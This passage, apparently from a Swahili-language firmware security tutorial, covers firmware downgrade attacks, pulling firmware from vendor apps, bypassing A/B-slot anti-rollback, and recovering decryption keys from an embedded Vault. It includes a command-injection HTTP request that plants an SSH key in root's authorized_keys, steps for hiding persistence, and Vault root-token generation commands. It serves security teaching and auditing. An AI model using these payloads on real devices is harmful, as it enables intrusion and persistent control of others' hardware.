   * Ipate kwenye tovuti ya umma ya vendor ya kupakua, CDN au tovuti ya usaidizi.
   * Itoe kwenye companion mobile/desktop applications (kwa mfano ndani ya Android APK kwenye `assets/firmware/`).
   * Ipate kwenye third-party repositories kama VirusTotal, Internet archives, forums, n.k.
2. **Pakia au toa image kwa kifaa** kupitia channel yoyote ya update iliyo wazi:
   * Web UI, mobile-app API, USB, TFTP, MQTT, n.k.
   * Vifaa vingi vya IoT vya watumiaji huweka wazi endpoints za HTTP(S) *zisizohitaji uthibitishaji*, ambazo hupokea firmware blobs zilizosimbwa kwa Base64, huzifungua upande wa server na kuanzisha recovery/upgrade.
3. Baada ya downgrade, exploit vulnerability iliyosahihishwa kwenye toleo jipya zaidi (kwa mfano command-injection filter iliyoongezwa baadaye).
4. Kwa hiari, flash image ya hivi karibuni tena au zima updates ili kuepuka kugunduliwa baada ya kupata persistence.

### Mfano: Command Injection Baada ya Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Katika firmware iliyo hatarini (iliyoshushwa toleo), kigezo cha `md5` huunganishwa moja kwa moja kwenye amri ya shell bila kusafishwa, na hivyo kuruhusu kuingiza amri zozote (hapa—kuwezesha ufikiaji wa root unaotumia funguo za SSH). Matoleo ya baadaye ya firmware yaliongeza kichujio cha msingi cha herufi, lakini kutokuwepo kwa ulinzi dhidi ya kushusha toleo kunafanya marekebisho hayo yasiwe na maana.<sup>[[4]](#references)</sup>

### Kutoa Firmware Kutoka Kwenye Programu za Simu

Wauzaji wengi hujumuisha picha kamili za firmware ndani ya programu zao saidizi za simu ili programu iweze kusasisha kifaa kupitia Bluetooth/Wi-Fi. Vifurushi hivi kwa kawaida huhifadhiwa bila usimbaji fiche ndani ya APK/APEX, katika njia kama `assets/fw/` au `res/raw/`. Zana kama `apktool`, `ghidra`, au hata `unzip` ya kawaida hukuwezesha kutoa picha zilizotiwa saini bila kugusa maunzi halisi.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Kupita anti-rollback ya updater pekee katika miundo ya slot za A/B

Baadhi ya vendor hutumia **ratchet** ya kuzuia downgrade, lakini ndani ya mantiki ya *updater* pekee (kwa mfano, routine ya UDS kupitia CAN, amri ya recovery, au agent ya OTA ya userspace). Ikiwa **bootloader** baadaye hukagua tu signature/CRC ya image na kuamini jedwali la partitions au metadata ya slot, ulinzi wa rollback bado unaweza kupitishwa.<sup>[[7]](#references)</sup>

Muundo dhaifu wa kawaida:

- Metadata ya firmware ina maelezo ya toleo pamoja na **security ratchet** / kaunta inayoongezeka tu.
- Updater hulinganisha ratchet ya image na thamani iliyohifadhiwa kwenye hifadhi endelevu na kukataa image zilizotiwa saini za matoleo ya zamani.
- **Bootloader** haisomi ratchet hiyo na hukagua tu header, CRC na signature kabla ya kuwasha slot iliyochaguliwa.
- Uwezeshaji wa slot huhifadhiwa kando kwenye jedwali la partitions au kaunta ya generation ya kila slot na **haujaunganishwa kwa njia ya kriptografia** na digest halisi ya firmware iliyothibitishwa.

Hii huunda primitive ya **thibitisha-image-moja / washa-image-nyingine** katika mifumo ya dual-slot. Ikiwa mshambuliaji anaweza kufanya updater iweke slot B kuwa lengwa la kuwashwa linalofuata kwa kutumia image ya sasa iliyotiwa saini, na baadaye akaandika upya slot B kabla ya reboot, bootloader bado inaweza kuwasha image iliyoshushwa toleo kwa sababu inaamini tu metadata ya slot iliyokwishawekwa.

Mfumo wa kawaida wa matumizi mabaya:

1. Pakia firmware **ya sasa iliyotiwa saini** kwenye slot isiyotumika kisha endesha routine ya kawaida ya uthibitishaji/kubadilisha slot ili mpangilio uweke slot hiyo kuwa inayofuata kuwashwa.
2. **Usifanye reboot bado**. Anzisha tena routine ya kuandaa/kufuta slot katika session hiyo hiyo.
3. Tumia vibaya hali ya boot iliyopitwa na wakati au mantiki ya uteuzi wa slot iliyopitwa na wakati ili updater ifute **slot ileile halisi** iliyopandishwa hivi punde.
4. Andika firmware **ya zamani lakini bado iliyotiwa saini** kwenye slot hiyo.
5. Ruka routine ya uthibitishaji inayotekeleza ratchet kisha fanya reboot moja kwa moja.
6. Bootloader huchagua slot iliyopandishwa, hukagua signature/integrity pekee, kisha huwasha image ya zamani.

Mambo ya kuchunguza unapofanya reverse engineering ya utekelezaji wa update za A/B:

- Uteuzi wa slot unaotokana na **flag za wakati wa boot** ambazo hazisasishwi baada ya mabadiliko kufanikiwa.
- Routine ya aina ya `prepare_passive_slot()` inayofuta slot kulingana na hali iliyopitwa na wakati badala ya **mpangilio wa sasa uliothibitishwa**.
- Function ya aina ya `part_write_layout()` inayoongeza tu **kaunta ya generation** / flag ya active na haihifadhi hash ya image iliyothibitishwa.
- Ukaguzi wa ratchet unaotekelezwa kwenye userspace au kwenye code ya updater, lakini **si** kwenye hatua za ROM / bootloader / secure boot.
- Routine za kufuta au recovery zinazoacha slot ikiwa imewekwa kuwa inaweza kuwashwa hata baada ya yaliyomo kufutwa na kuandikwa upya.

### Orodha ya Kukagua Mantiki ya Update

* Je, transport/authentication ya *update endpoint* inalindwa vya kutosha (TLS + authentication)?
* Je, kifaa hulinganisha **nambari za toleo** au **kaunta ya monotonic anti-rollback** kabla ya kuflash?
* Je, image inathibitishwa ndani ya secure boot chain (kwa mfano, signatures hukaguliwa na ROM code)?
* Je, **bootloader hutekeleza ratchet ileile** kama updater, badala ya kukagua signature/CRC pekee?
* Je, metadata ya kuwezesha slot **imefungamanishwa na digest/toleo la firmware lililothibitishwa**, au slot inaweza kurekebishwa baada ya kupandishwa?
* Baada ya kubadilisha slot kufanikiwa, je, kifaa hulazimishwa kufanya reboot, au routine za baadaye za update/kufuta bado zinaweza kufikiwa katika session hiyo hiyo?
* Je, code ya userland hufanya ukaguzi wa ziada wa busara (kwa mfano, ramani ya partitions inayoruhusiwa, nambari ya modeli)?
* Je, mtiririko wa update wa *sehemu* au wa *backup* hutumia tena mantiki ileile ya uthibitishaji?

> 💡 Ikiwa lolote kati ya yaliyo hapo juu halipo, huenda mfumo unaweza kushambuliwa kwa rollback.

## Firmware zilizo hatarini kwa mazoezi

Ili kufanya mazoezi ya kugundua vulnerabilities kwenye firmware, tumia miradi ifuatayo ya firmware zilizo hatarini kama mwanzo.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Kurejesha funguo za usimbuaji za firmware kutoka hali ya KMS/Vault iliyopachikwa

Wakati image ya update ina metadata ndogo ya maandishi wazi iliyochanganywa na blob kubwa yenye entropy ya juu, kagua muundo wa kontena kabla ya kujaribu brute-force:<sup>[[1]](#references)</sup>

- Tupa headers, offsets na mipaka ya mistari kwa kutumia `hexdump`, `xxd`, `strings -tx`, `base64 -d`, na `binwalk -E`.
- `Salted__` kwa kawaida humaanisha umbizo la OpenSSL `enc`: baiti 8 zinazofuata ni salt na baiti zilizosalia ni ciphertext.
- Field ya Base64 inayodecode hadi baiti `256` hasa ni kidokezo kikubwa kwamba unatazama ciphertext ya RSA-2048 inayofunika password/random session key ya firmware.
- Nyenzo ya PGP iliyotenganishwa iliyo kwenye faili hiyo hiyo mara nyingi hulinda uhalisi pekee; usidhani ndiyo njia ya usiri.

Ikiwa utafutaji wa funguo tuli (`grep`, `strings`, utafutaji wa PEM/PGP) hautafaulu, fanya reverse engineering ya **njia ya uendeshaji ya decrypt** badala ya kutafuta private keys pekee:

- Decompile binary ya updater / management na fuatilia ni nani anayesoma blob iliyosimbwa, ni helper/API gani inayoifungua, na jina la kimantiki la key inaloomba.
- Tafuta hali ya KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) pamoja na unit files na init scripts kwenye root filesystem iliyotolewa.
- Chukulia `vault operator unseal ...` ya maandishi wazi, recovery keys, bootstrap tokens, au scripts za auto-unseal za KMS ya ndani kuwa sawa na nyenzo ya private-key.

Ikiwa appliance inasafirisha binary ya awali ya Vault na backend ya hifadhi, kuendesha tena mazingira hayo kwa kawaida ni rahisi kuliko kutekeleza upya ndani ya Vault:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Ukiwa na root kwenye KMS iliyoklonishwa:

- Fanya transit keys ziweze ku-exportiwa ndani ya clone iliyotengwa pekee: `vault write transit/keys/<name>/config exportable=true`
- Export ufunguo wa unwrap: `vault read transit/export/encryption-key/<name>`
- Jaribu RSA key iliyopatikana kwa jozi sahihi ya padding/hash iliyotumiwa na KMS. Kushindwa kwa decryption ya PKCS#1 v1.5 na kushindwa kwa decryption chaguomsingi ya OAEP **hakuthibitishi** kuwa key si sahihi; mifumo mingi inayotumia Vault hutumia OAEP yenye SHA-256, ilhali maktaba za kawaida hutumia SHA-1 kama chaguomsingi.
- Ikiwa payload inaanza na `Salted__`, rudia KDF ya OpenSSL ya vendor kwa usahihi (`EVP_BytesToKey`, mara nyingi MD5 kwenye vifaa vya zamani) kabla ya kujaribu decryption ya AES-CBC.

Hii hubadilisha "firmware iliyosimbwa kwa njia fiche" kuwa tatizo pana zaidi: **pata operational keys za upande wa kifaa, kisha rudia vigezo halisi vya unwrap + KDF nje ya mtandao**.

## Mafunzo na Vyeti

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Kuvunja Firmware kwa Claude: Ujuzi wa Ngazi ya Mtaalamu, Uhuru wa Ngazi ya Mwanzoni](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Mbinu ya Kupima Usalama wa Firmware](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Udukuzi wa IoT kwa Vitendo: Mwongozo Kamili wa Kushambulia Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Kutumia zero-days kwenye vifaa vilivyoachwa – blogu ya Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Jinsi Kifaa Mahiri cha $20 Kilivyonipa Ufikiaji wa Nyumba Yako](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sasa Unaniona: Sasa Umedukuliwa](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Kutumia Tesla Wall Connector kupitia kiunganishi chake cha chaji - Sehemu ya 2: kukwepa anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Ifanye Iwake: Unyonyaji wa Philips Hue Bridge kupitia hewani](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS kwenye QEMU Sehemu ya 2: Utatuzi wa hitilafu na urekebishaji](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
{{#include ../../banners/hacktricks-training.md}}
